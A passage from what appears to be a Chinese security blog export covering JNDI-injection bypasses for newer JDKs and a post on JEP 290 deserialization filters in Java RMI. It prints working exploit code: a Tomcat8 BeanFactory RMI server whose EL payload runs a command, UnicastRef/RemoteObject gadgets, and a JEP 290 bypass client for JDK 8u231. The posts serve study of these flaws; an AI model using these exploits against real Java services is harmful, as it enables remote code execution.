和11.0.1以后的版本中，也修复了这个漏洞，这个在之后高版本绕过的部分再说。 基于DNS这个实际上并不是作为攻击的手段，而是作为一种探测手段 之前我们说过，JNDI注入的前提是存在一个lookup方法，且其中的url可控 其攻击过程为 所以如果直接使用RMI或者LDAP来测试是否存在JNDI注入，会比较繁琐，且有可能暴露自己的服务端，有被反打的可能，所以这时候就可以先用dns来测试一下。 不过即使收到请求也不一定就是有JNDI注入，比如JDK版本、防火墙之类的也会限制漏洞利用 基于CORBA本来以为这玩意没法用的，不过看见了这么一篇文章 https://thonsun.github.io/2020/12/02/jndi-zhu-ru-li-yong-fen-xi/#toc-heading-8 不过这个利用条件过于苛刻了，所以不复现了，当了解。 高版本绕过在高版本的jdk中，把LDAP的路也堵上了 堵的方法就是在最后一步，加载类字节码之前判断trustURLCodebase，只有为true的时候才能进行远程的类加载 这也就代表着无依赖的JNDI注入彻底结束了。 因为在低版本中，我们不需要去依赖什么，就可以借助JNDI注入来RCE，但是高版本就需要依赖一些其他的包了，因为既然不让远程加载恶意字节码，那我加载点本地自带的然后把它实例化总可以吧。 而根据getObjectFactoryFromReference这里类加载的部分可以很容易知道，如果想进行实例化，那这个类必须是个ObjectFactory类型 ObjectFactory是个接口，所以我们的目标就是找个实现了这个接口的类 基于Tomcat8的绕过tomcat8的org.apache.naming.factory.BeanFactory就很适合作为我们加载的类。而且由于它在tomcat8的依赖里，那么攻击面和利用条件也是很可观的。 org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。 bean 也就是前边说的实例化Reference所指向的任意Bean Class valueArray 添加依赖 &lt;dependency> &lt;groupId>org.apache.tomcat&lt;/groupId> &lt;artifactId>tomcat-catalina&lt;/artifactId> &lt;version>8.5.0&lt;/version> &lt;/dependency> &lt;dependency> &lt;groupId>org.lucee&lt;/groupId> &lt;artifactId>javax.el&lt;/artifactId> &lt;version>3.0.0&lt;/version> &lt;/dependency> bypass的代码 import com.sun.jndi.rmi.registry.ReferenceWrapper; &#x2F;&#x2F; 导入 ReferenceWrapper 类，用于包装引用对象 import org.apache.naming.ResourceRef; &#x2F;&#x2F; 导入 ResourceRef 类，用于创建资源引用对象 import javax.naming.StringRefAddr; &#x2F;&#x2F; 导入 StringRefAddr 类，用于创建字符串引用地址对象 import java.rmi.registry.LocateRegistry; &#x2F;&#x2F; 导入 LocateRegistry 类，用于定位 RMI 注册表 import java.rmi.registry.Registry; &#x2F;&#x2F; 导入 Registry 类，用于操作 RMI 注册表 public class RMI_Server_ByPass &#123; public static void main(String[] args) throws Exception &#123; Registry registry &#x3D; LocateRegistry.createRegistry(1099); &#x2F;&#x2F; 创建 RMI 注册表对象并监听指定端口（1099） ResourceRef resourceRef &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null); &#x2F;&#x2F; 创建 ResourceRef 对象，表示一个资源引用，参数依次为类名、类工厂位置、工厂位置、工厂对象实例化标志、工厂类名、工厂对象实例化位置 resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster&#x3D;eval&quot;)); &#x2F;&#x2F; 添加字符串引用地址对象到 ResourceRef 对象中，参数为引用地址类型和引用地址值 resourceRef.add(new StringRefAddr(&quot;faster&quot;, &quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&quot;)); &#x2F;&#x2F; 添加字符串引用地址对象到 ResourceRef 对象中，参数为引用地址类型和引用地址值 ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(resourceRef); &#x2F;&#x2F; 使用 ResourceRef 对象创建 ReferenceWrapper 对象，用于包装引用对象 registry.bind(&quot;Tomcat8bypass&quot;, referenceWrapper); &#x2F;&#x2F; 在 RMI 注册表中绑定 ReferenceWrapper 对象，参数为绑定的名称和要绑定的对象 System.out.println(&quot;Registry运行中......&quot;); &#x2F;&#x2F; 输出信息到控制台，表示 RMI 注册表运行中 &#125; &#125; 其实就是按照BeanFactory的要求来构造的 然后被攻击的客户端就正常代码，不过要在tomcat8环境下 （开发0基础，不会配tomcat8环境，就先这样吧，等以后有时间了再弄一下 参考链接https://goodapple.top/archives/696 https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/ 红队攻击手特训营-JNDI注入漏洞挖掘_哔哩哔哩_bilibili 从文档开始的jndi注入之路-2 jndi+ldap绕过_哔哩哔哩_bilibili","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"}]},{"title":"RMI攻击（三）","slug":"RMI攻击（三）","date":"2023-05-20T09:05:44.000Z","updated":"2023-05-22T02:54:35.890Z","comments":true,"path":"2023/05/20/RMI攻击（三）/","link":"","permalink":"https://ethe448.github.io/2023/05/20/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"","text":"最后一篇了吧（大概 前两篇介绍了RMI的流程和基础的攻击，这一篇写点进阶的东西 JEP290在JDK6u141、JDK7u131、JDK 8u121加入了JEP 290限制,JEP 290过滤策略有 进程级过滤器 可以将进程级序列化过滤器作为命令行参数（“-Djdk.serialFilter =”）传递，或将其设置为$JAVA_HOME/conf/security/java.security中的系统属性。 自定义过滤器 可以使用自定义过滤器来重写特定流的进程级过滤器 内置过滤器 JDK分别为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。 这里我把jdk版本换成jdk1.8.0_111,默认使用内置过滤器。然后直接使用上面的服务端攻击注册中心poc看下,执行完RMI Registry会提示这样的一个错误: 这就是JEP290限制导致的 JEP 290 核心类JEP 290 涉及的核心类有： ObjectInputStream 类，ObjectInputFilter 接口，Config 静态类以及 Global 静态类。其中 Config 类是 ObjectInputFilter接口的内部类，Global 类又是Config类的内部类。 ObjectInputStream 类JEP 290 进行过滤的具体实现方法是在 ObjectInputStream 类中增加了一个serialFilter属性和一个 filterChcek 函数，两者搭配来实现过滤的。 构造函数有两个构造函数，我们需要关注的是在这两个构造函数中都会赋值 serialFilter 字段为 ObjectInputFilter.Config.getSerialFilter(): 跟一下可以发现，ObjectInputFilter.Config.getSerialFilter():返回的内容是ObjectInputFilter接口里的一个静态属性 serialFilter 属性这个属性是ObjectInputFilter类型的，这是一个接口 这个接口又声明了一个 checkInput 方法 filterCheck 函数 看名字就知道这是个负责过滤的方法 它分了三步 第一步，先会判断 serialFilter 属性值是否为空，只有不为空，才会进行后续的过滤操作。 第二步，将我们需要检查的 class ，以及 arryLength等信息封装成一个FilterValues对象，传入到 serialFilter.checkInput 方法中，返回值为 ObjectInputFilter.Status 类型。 最后一步，判断 status 的值，如果 status 是 null 或者是 REJECTED 就会抛出异常。 ObjectInputStream 总结到这里可以知道，serialFilter 属性就可以认为是 JEP 290 中的&quot;过滤器&quot;。过滤的具体逻辑写到 serialFilter 的checkInput 方法中，配置过滤器其实就是设置 ObjectInputStream 对象的 serialFilter属性。并且在 ObjectInputStream 构造函数中会赋值 serialFilter 为 ObjectInputFilter#Config 静态类的 serialFilter 静态字段。 ObjectInputFilter 接口是 JEP 290 中实现过滤的一个最基础的接口，想理解 JEP 290 ，必须要了解这个接口。 在低于 JDK 9 的时候的全限定名是 sun.misc.ObjectInputFIlter，JDK 9 及以上是 java.io.ObjectInputFilter 。 另外低于 JDK 9 的时候，是 getInternalObjectInputFilter 和 setInternalObjectInputFilter，JDK 9 以及以上是 getObjectInputFilter 和 setObjectInputFIlter 。 这是它的结构 有一个 checkInput 函数，一个静态类 Config ，一个 FilterInfo 接口，一个 Status 枚举类。 函数式接口@FunctionalInterface 注解表明， ObjectInputFilter 是一个函数式接口。对于不了解函数式接口的同学，可以参考：https://www.runoob.com/java/java8-functional-interfaces.html 以及 https://www.jianshu.com/p/40f833bf2c48 ， https://juejin.cn/post/6844903892166148110 。 （我一直觉得这个lambda表达式怪逆天的，为了省两三行代码，把可读性搞得这么差 这里我们其实只需要关心函数式接口怎么赋值，函数式接口的赋值可以是： lambda 表达式或者是方法引用，当然也可以赋值一个实现了这个接口的对象 Config 静态类Config 静态类是 ObjcectInputFilter 接口的一个内部静态类。 Config#configuredFilter 静态字段configuredFilter 的赋值操作是在Config类的静态代码块里，所以调用 Config 类的时候就会触发 configuredFilter 字段的赋值。 可以看到会拿到 SERIAL_FILTER_PROPNAME（也就是jdk.serailFilter) 属性值，如果不为空，会返回 createFilter(props)的结果（createFilter 实际返回的是一个 Global 对象）。 jdk.serailFilter 属性值获取的方法用两种，第一种是获取 JVM 的 jdk.serialFilter 属性，第二种通过在 %JAVA_HOME%\\conf\\security\\java.security 文件中指定 jdk.serialFilter 来设置。 Config#createFilter 方法 Config#createFilter 则会进一步调用 Global.createFilter方法，这个方法在介绍 Global 类的时候会说，其实就是将传入的 JEP 290 规则字符串解析到Global对象的 filters 字段上，并且返回这个 Global 对象。 Config 静态类总结Config会将Config.serialFilter 赋值为一个Global对象，这个Global 对象的filters字段值是jdk.serailFilter属性对应的 Function 列表。（关于 Global 对象介绍下面会说到，大家先有这么一个概念） 而 ObjectInputStream 的构造函数中，正好取的就是 Config.serialFilter 这个静态字段 ， 所以设置了 Config.serialFilter 这个静态字段，就相当于设置了 ObjectInputStream 类全局过滤器。 还可以通过配置 JVM 的 jdk.serialFilter 或者 %JAVA_HOME%\\conf\\security\\java.security 文件的 jdk.serialFilter 字段值，来设置 Config.serialFilter ，也就是设置了全局过滤。 另外还有就是一些框架，在开始的时候设置也会设置 Config.serialFilter ，来设置 ObjectInputStream 类的全局过滤。 weblogic 就是，在启动的时候会设置 Config.serialFilter 为 WebLogicObjectInputFilterWrapper 对象。 Global 静态类Global 静态类是 Config 类中的一个内部静态类。 Global 类的一个重要特征是实现了 ``ObjectInputFilter接口，实现了其中的checkInput方法。所以Global类可以直接赋值到ObjectInputStream.serialFilter` 上。 Global#filters 字段是一个函数列表。 Global#checkInput 方法 Global 类的 checkInput 会遍历 filters 去检测要反序列化的类。 Global 中的构造函数构造方法解析相关配置的JEP290规则语法，以;分割将其作为一个个规则，然后添加到 Global.filters 。 Global#createFilter 方法传入规则字符串，来实例化一个 Global 对象。 Global 类的总结Global 实现了ObjectInputFilter接口，所以是可以直接赋值到 ObjectInputStream.serialFilter 上。 Global#filters 字段是一个函数列表。 Global 类中的 chekInput 方法会遍历 Global#filters 的函数，传入需要检查的 FilterValues进行检查（FilterValues 中包含了要检查的 class, arrayLength，以及 depth 等）。 过滤器在上面总结 ObjectInputStream 类的中说过，配置过滤器其实就是设置 ObjectInputStream 类中的 serialFilter 属性。 过滤器的类型有两种，第一种是通过配置文件或者 JVM 属性来配置的全局过滤器，第二种则是来通过改变 ObjectInputStream 的 serialFilter 属性来配置的局部过滤器。 全局过滤器设置全局过滤器，其实就是设置Config静态类的 serialFilter 静态字段值。 具体原因是因为在 ObjectInputStream 的两个构造函数中，都会为 serialFilter 属性赋值为 ObjectInputFilter.Config.getSerialFilter() 。 而 ObjectInputFilter.Config.getSerialFilter 就是直接返回 Config#serialFilter： jdk.serailFilter在介绍 Config 静态类的时候说到，Config 静态类初始化的时候，会解析 jdk.serailFilter 属性设置的 JEP 290 规则到一个 Global 对象的 filters 属性，并且会将这个 Global 对象赋值到 Config 静态类的 serialFilter 属性上。 所以，这里 Config.serialFilter 值默认是解析 jdk.serailFilter 属性得到得到的 Global 对象。 局部过滤器设置局部过滤器的意思是在 new objectInputStream 对象之后，再通过改变单个 ObjectInputStream 对象的 serialFilter字段值来实现局部过滤。 改变单个 ObjectInputStream 对象的 serialFilter 字段是有两种方法： 1.通过调用 ObjectInputStream 对象的 setInternalObjectInputFilter 方法： 2.通过调用 Config.setObjectInputFilter ： 这个其实就是通过setObjectInputFilter调到setInternalObjectInputFilter 方法 局部过滤器典型的例子是 RMI 中针对 RegsitryImpl 和 DGCImpl有关的过滤。 JEP 290对RMI的限制在没有JEP 290之前，我们RMI攻击的路线有 客户端攻击注册中心服务端攻击注册中心注册中心攻击客户端服务端攻击客户端客户端攻击服务端DGC客户端攻击DGC服务端DGC服务端攻击DGC客户端JRMP服务端攻击JRMP客户端 接下来我们看一下JEP 290限制了什么 这里就不跟代码了，直接贴结果 1、RegistryImpl_Skel强制RegistryImpl.checkAccess验证限制服务端和注册中心必须在同一host，相当于强制将服务端和注册中心绑定在一起，也就没有这两者之间的远程互相攻击了。2、配置了registry过滤器RegistryImpl_Skel里面的对象反序列化时会进行白名单校验，内容如下： if (String.class &#x3D;&#x3D; clazz || java.lang.Number.class.isAssignableFrom(clazz) || Remote.class.isAssignableFrom(clazz) || java.lang.reflect.Proxy.class.isAssignableFrom(clazz) || UnicastRef.class.isAssignableFrom(clazz) || RMIClientSocketFactory.class.isAssignableFrom(clazz) || RMIServerSocketFactory.class.isAssignableFrom(clazz) || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz) || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123; return ObjectInputFilter.Status.ALLOWED; &#125; else &#123; return ObjectInputFilter.Status.REJECTED; &#125; 也就是白名单有 String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory / ActivationID / UID 只要反序列化的类不是白名单中的类，就会返回 REJECTED 操作符，表示序列化流中有不合法的内容，直接抛出异常。 没有任何一条完整的反序列化攻击链能通过这个白名单，这样前面攻击注册中心的方法都失效了。但RegistryImpl_Stub里面的方法没有过滤，毕竟为了功能正常使用是没办法白名单的，所以注册中心攻击客户端依然可行。 3、配置了DGC过滤器 DGC里的白名单校验更加严格 DGCImpl_Skel和DGCImpl_Stub里面的对象反序列化时会进行白名单校验，内容如下： return (clazz &#x3D;&#x3D; ObjID.class || clazz &#x3D;&#x3D; UID.class || clazz &#x3D;&#x3D; VMID.class || clazz &#x3D;&#x3D; Lease.class) ? ObjectInputFilter.Status.ALLOWED : ObjectInputFilter.Status.REJECTED; 这相当于直接断了攻击DGC的路 所以现在，我们还有的攻击路线是 客户端攻击服务端服务端攻击客户端注册中心攻击客户端JRMP服务端攻击JRMP客户端 这四种都是不用变的，但是我们想绕过JEP 290的限制应该怎么做呢？ RMI里的反序列化既然JEP 290限制了我们反序列化的类，那我们就需要去找这里可以利用的类如何进行反序列化 1. UnicastRemoteObjectjava.rmi.server.UnicastRemoteObject 类通常是远程调用接口实现类的父类，或直接使用其静态方法 exportObject 来创建动态代理并随机监听本机端口以提供服务。 因此不难理解，在反序列化此类以及其子类后，依旧需要执行 exportObject 的相关操作，直接来看一下 UnicastRemoteObject 的 readObject 方法： 执行了reexport，又执行了 exportObject 方法。 所以UnicastRemoteObject这个类进行反序列化的时候，就相当于成为了一个JRMP的服务端，然后如果存在恶意的JRMP客户端，就有可能被攻击。 感觉这玩意怪鸡肋的，可能是我水平的问题，感觉和JRMPListener不是很像。JRMPListener是通过恶意JRMP服务端打客户端，但是这个是让自己监听自己的端口，相当于一个服务端， 想了一下，可能是通过UnicastRemoteObject的反序列化，然后让被攻击端发起一个网络请求，变成一个JRMP服务端，然后我们就可以通过恶意的客户端去进行攻击了。UnicastRemoteObject也是Remote的子类，所以能进行反序列化不受影响。但是仅凭这玩意没法绕过JEP 290，因为最主要的还是恶意客户端攻击的时候传的payload 2. UnicastRefsun.rmi.server.UnicastRef 类实现了 Externalizable 接口，因此在其反序列化时，会调用其 readExternal 方法执行额外的逻辑。 UnicastRef 的 readExternal 方法调用 LiveRef.read(var1, false) 方法来还原成员变量 LiveRef ref 属性。 LiveRef 的 read 方法在创建 LiveRef 对象后，调用 DGCClient 的 registerRefs 方法来将其在环境中进行注册。 调用 DGCClient$EndpointEntry#registerRefs 方法 继续调用 makeDirtyCall 方法 然后就会调用dgc的dirty方法 因此可以看出，在 UnicastRef 进行反序列化时，会触发 DGC 通信及 dirty 方法调用，此时如果与一个恶意服务通信，返回恶意数据流，则会造成反序列化漏洞。 poc public static void main(String[] args) throws Exception &#123; String host &#x3D; &quot;127.0.0.1&quot;; int port &#x3D; 12233; ObjID id &#x3D; new ObjID(new Random().nextInt()); &#x2F;&#x2F; RMI registry TCPEndpoint te &#x3D; new TCPEndpoint(host, port); UnicastRef ref &#x3D; new UnicastRef(new LiveRef(id, te, false)); ser(ref); unser(); &#125; 3. RemoteObjectRemoteObject 是几乎所有 RMI 远程调用类的父类。这个类也可以用来触发反序列化漏洞。 RemoteObject 的 readObject 方法会先反序列化成员变量 RemoteRef ref ，最后调用其 readExternal 方法，可以用来触发上一条 UnicastRef 链。 因此我们随便找一个 RemoteObject 的子类，在其实例中放入 UnicastRef 对象，反序列化时均可触发利用链。例如如下利用代码， public static void main(String[] args) throws Exception &#123; String host &#x3D; &quot;127.0.0.1&quot;; int port &#x3D; 12233; ObjID id &#x3D; new ObjID(new Random().nextInt()); &#x2F;&#x2F; RMI registry TCPEndpoint te &#x3D; new TCPEndpoint(host, port); UnicastRef ref &#x3D; new UnicastRef(new LiveRef(id, te, false)); RMIServerImpl_Stub stub &#x3D; new RMIServerImpl_Stub(ref); ser(stub); unser(); &#125; 绕过JEP 290 根据我们前面说的，我们可以得到这样一个绕过JEP 290的方法 首先借助RMI原生的、且在白名单里的类，将其作为客户端的参数，然后在注册中心进行反序列化读取的时候，触发JRMP请求，我们可以规定向我们的恶意JRMP服务端进行请求，这样就可以实现对JEP 290的绕过 服务端代码不变 客户端为 public class RMIClient &#123; public static void main(String[] args) throws Exception &#123; Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1098); &#x2F;&#x2F;unicastref构造反序列化 String host &#x3D; &quot;127.0.0.1&quot;; int port &#x3D; 12233; ObjID id &#x3D; new ObjID(new Random().nextInt()); &#x2F;&#x2F; RMI registry TCPEndpoint te &#x3D; new TCPEndpoint(host, port); UnicastRef ref1 &#x3D; new UnicastRef(new LiveRef(id, te, false)); RMIServerImpl_Stub stub &#x3D; new RMIServerImpl_Stub(ref1); &#x2F;&#x2F;获取ref Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;); Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;); declaredField.setAccessible(true); RemoteRef ref0 &#x3D; (RemoteRef)declaredField.get(registry); &#x2F;&#x2F;获取 operations Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;); Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;); operations_field.setAccessible(true); Operation[] operations &#x3D; (Operation[])operations_field.get(registry); &#x2F;&#x2F;伪造lookup RemoteCall var2 &#x3D; ref0.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); ObjectOutput var3 &#x3D; var2.getOutputStream(); var3.writeObject(stub); ref0.invoke(var2); &#125; JDK8u231没环境了，照抄了（ 修复而在jdk8u231中，RMI又增加了新的安全措施。首先是对注册中心进行了加固，更新后的RegistryImpl_Skel#dispatch case 2: &#x2F;&#x2F; lookup(String) &#123; java.lang.String $param_String_1; try &#123; java.io.ObjectInput in &#x3D; call.getInputStream(); $param_String_1 &#x3D; (java.lang.String) in.readObject(); &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123; call.discardPendingRefs(); throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); &#125; java.rmi.Remote $result &#x3D; server.lookup($param_String_1); try &#123; java.io.ObjectOutput out &#x3D; call.getResultStream(true); out.writeObject($result); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e); &#125; break; &#125; ...... 可以和8u231之前的比较一下 其实就多了一行 call.discardPendingRefs();,但是这个方法会在反序列化出错之后把incomingRefTable清空。那么在ConnectionInputStream#registerRefs就进不去ConnectionInputStream#registerRefs了。而且由于我们是自己重写的lookup，传的是个Object类型而不是String，所以在强转的时候一定会进catch里的 还有一处修复在DGCImpl_Stub public void clean(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.VMID $param_VMID_3, boolean $param_boolean_4) throws java.rmi.RemoteException &#123; try &#123; StreamRemoteCall call &#x3D; (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this, operations, 0, interfaceHash); call.setObjectInputFilter(DGCImpl_Stub::leaseFilter); try &#123; java.io.ObjectOutput out &#x3D; call.getOutputStream(); out.writeObject($param_arrayOf_ObjID_1); out.writeLong($param_long_2); out.writeObject($param_VMID_3); out.writeBoolean($param_boolean_4); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e); &#125; ref.invoke(call); ref.done(call); &#125; catch (java.lang.RuntimeException e) &#123; throw e; &#125; catch (java.rmi.RemoteException e) &#123; throw e; &#125; catch (java.lang.Exception e) &#123; throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e); &#125; &#125; &#x2F;&#x2F; implementation of dirty(ObjID[], long, Lease) public java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.Lease $param_Lease_3) throws java.rmi.RemoteException &#123; try &#123; StreamRemoteCall call &#x3D; (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this, operations, 1, interfaceHash); call.setObjectInputFilter(DGCImpl_Stub::leaseFilter); try &#123; java.io.ObjectOutput out &#x3D; call.getOutputStream(); out.writeObject($param_arrayOf_ObjID_1); out.writeLong($param_long_2); out.writeObject($param_Lease_3); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e); &#125; ref.invoke(call); java.rmi.dgc.Lease $result; Connection connection &#x3D; call.getConnection(); try &#123; java.io.ObjectInput in &#x3D; call.getInputStream(); $result &#x3D; (java.rmi.dgc.Lease) in.readObject(); &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123; if (connection instanceof TCPConnection) &#123; &#x2F;&#x2F; Modified to prevent re-use of the connection after an exception ((TCPConnection) connection).getChannel().free(connection, false); &#125; call.discardPendingRefs(); throw new java.rmi.UnmarshalException(&quot;error unmarshalling return&quot;, e); &#125; finally &#123; ref.done(call); &#125; return $result; &#125; catch (java.lang.RuntimeException e) &#123; throw e; &#125; catch (java.rmi.RemoteException e) &#123; throw e; &#125; catch (java.lang.Exception e) &#123; throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e); &#125; &#125; 和之前的比一下 可以看到它把setObjectInputFilter方法提前了，在旧版本中，我们攻击JRMP客户端的时候直接调用了ref.invoke(call);去触发反序列化，对于后面的过滤器可以不用考虑，但是现在过滤器在我们的反序列化之前了。 这对于之前的JRMP攻击方式来说都是致命的 绕过从前面的分析可以知道，如果想在不知道远程接口的情况想攻击注册中心/服务端，目前能控制的最大范围就是注册中心和DGC的filter里面限制的几个类。 这里绕过思路很容易想到，思路大致是：在RegistryImpl_Skel#dispatch反序列化时(还没反序列化完，绕过报错)，在这里就发出JRMP请求，不需要后面的releaseInputStream，同时也不需要在DGC客户端的ConnectionInputStream中完成readObject，而是另起一道来执行(绕过DGC层过滤)。 但是真正去找这么一条利用链是很困难的。我们要先看一下白名单有哪些可以用：1、RegistryImpl_Skel，允许Remote/UnicastRef/RMIClientSocketFactory/RMIServerSocketFactory/ActivationID/UID2、DGCImpl_Skel，允许ObjID/UID/VMID/Lease看看这些类哪些是可以序列化并且重写了readObject/readExternal之类改变调用流程的，找了下有这些：UnicastRefUnicastRef2UnicastServerRefActivationIDRemoteObjectUnicastRemoteObject 这里我直接说了，在JDK8u231的情况下，采用的是UnicastRemoteObject实现的反序列化绕过 这是一条由国外的An Trinh师傅提出来的攻击方法，原文在[这篇文章][An Trinhs RMI Registry Bypass | MOGWAI LABShttps://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/)]里 这个payload会在readobject函数调用过程直接触发JRMP请求 在8u231之前，我们的反序列化攻击的流程是 readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。 在readobejct反序列化的过程中填装UnicastRef类到incomingRefTable 在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求 而An Trinh这条利用链的攻击流程是 readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到incomingRefTable 在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，An Trinh的Gadgets会在这里触发一次JRMP请求 在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求 这个利用链的开始点是UnicastRemoteObject的readObject方法。和我们之前说的在RMI里的反序列化那章的UnicastRemoteObject不同，这里在调用reexport后，对ssf进行了填充 因此会进入else里的exportObject 然后遇见exportObject就往里跟，最后会发现调用了TCPTransport的exportObject方法，其中又调用了listen方法 listen里调用了TCPEndpoint类的newServerSocket方法 在这里，他调用了我们ssf的createServerSocket方法 那假如我们这里的ssf是个代理类，就可以先进入代理类的invoke方法了 要知道，我们绕这么一大圈，最后还是要走UnicastRef#invoke-&gt;StreamRemoteCall#executeCall-&gt;注册中心/服务端攻击客户端这条路 这里的这个代理类就是RemoteObjectInvocationHandler 为什么选这个类呢，因为重载了我们之前用的UnicastRef的invoke方法 在重载后的这个invoke里，同样调用了executeCall 从分析里就能看出来，这个只需要把ssf设置成一个代理RMIServerSocketFactory接口的动态代理，里面放RemoteObjectInvocationHandler，调用这里时最终就触发了executeCall 不过在在之后还有一个问题 就是在RegistryImpl_Stub的方法里调用了writeObject，而writeObject里有个判断 如果enableReplace为true。 检测我们要序列化的obj，是否实现Remote/RemoteStub，由于UnicastRemoteObject实现了Remote，没有实现RemoteStub，于是会进入判断，就会替换我们的obj，以至于反序列化的时候不能还原我们构造的类。 所以，需要把enableReplace改为false。 （这是https://www.anquanke.com/post/id/211722#h3-5这篇文章的代码图，但是我本地的8u231版本里的writeObject并不长这样，而且调试的时候enableReplace本来就是false，很怪，但是由于没有找到原因，所以我选择相信这篇文章，可能是因为我没有231的源码所以调试的时候出了点问题 抄一个exp，这个原本是重写了bind方法的，我试着重写了lookup方法，也能触发 public class BypassJEP290ByUnicastRemoteObject &#123; public static void main(String[] args) throws Exception &#123; UnicastRemoteObject payload &#x3D; getPayload(); Registry registry &#x3D; LocateRegistry.getRegistry(1098); &#x2F;&#x2F; bindReflection(&quot;pwn&quot;, payload, registry); lookupReflection(payload, registry); &#125; static UnicastRemoteObject getPayload() throws Exception &#123; ObjID id &#x3D; new ObjID(new Random().nextInt()); TCPEndpoint te &#x3D; new TCPEndpoint(&quot;localhost&quot;, 12233); UnicastRef ref &#x3D; new UnicastRef(new LiveRef(id, te, false)); System.getProperties().put(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;); RemoteObjectInvocationHandler handler &#x3D; new RemoteObjectInvocationHandler(ref); RMIServerSocketFactory factory &#x3D; (RMIServerSocketFactory) Proxy.newProxyInstance( handler.getClass().getClassLoader(), new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;, handler ); Constructor&lt;UnicastRemoteObject&gt; constructor &#x3D; UnicastRemoteObject.class.getDeclaredConstructor(); constructor.setAccessible(true); UnicastRemoteObject unicastRemoteObject &#x3D; constructor.newInstance(); Field field_ssf &#x3D; UnicastRemoteObject.class.getDeclaredField(&quot;ssf&quot;); field_ssf.setAccessible(true); field_ssf.set(unicastRemoteObject, factory); return unicastRemoteObject; &#125; static void bindReflection(String name, Object obj, Registry registry) throws Exception &#123; Field ref_filed &#x3D; RemoteObject.class.getDeclaredField(&quot;ref&quot;); ref_filed.setAccessible(true); UnicastRef ref &#x3D; (UnicastRef) ref_filed.get(registry); Field operations_filed &#x3D; RegistryImpl_Stub.class.getDeclaredField(&quot;operations&quot;); operations_filed.setAccessible(true); Operation[] operations &#x3D; (Operation[]) operations_filed.get(registry); RemoteCall remoteCall &#x3D; ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L); ObjectOutput outputStream &#x3D; remoteCall.getOutputStream(); Field enableReplace_filed &#x3D; ObjectOutputStream.class.getDeclaredField(&quot;enableReplace&quot;); enableReplace_filed.setAccessible(true); enableReplace_filed.setBoolean(outputStream, false); outputStream.writeObject(name); outputStream.writeObject(obj); ref.invoke(remoteCall); ref.done(remoteCall); &#125; static void lookupReflection(Object obj, Registry registry) throws Exception &#123; Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;); Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;); declaredField.setAccessible(true); RemoteRef ref0 &#x3D; (RemoteRef) declaredField.get(registry); &#x2F;&#x2F;获取 operations Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;); Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;); operations_field.setAccessible(true); Operation[] operations &#x3D; (Operation[]) operations_field.get(registry); &#x2F;&#x2F;伪造lookup RemoteCall var2 &#x3D; ref0.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); ObjectOutput var3 &#x3D; var2.getOutputStream(); Field enableReplace_filed &#x3D; ObjectOutputStream.class.getDeclaredField(&quot;enableReplace&quot;); enableReplace_filed.setAccessible(true); enableReplace_filed.setBoolean(var3, false); var3.writeObject(obj); ref0.invoke(var2); &#125; &#125; 补充另外还有一点关于JEP 290绕过方式的补充 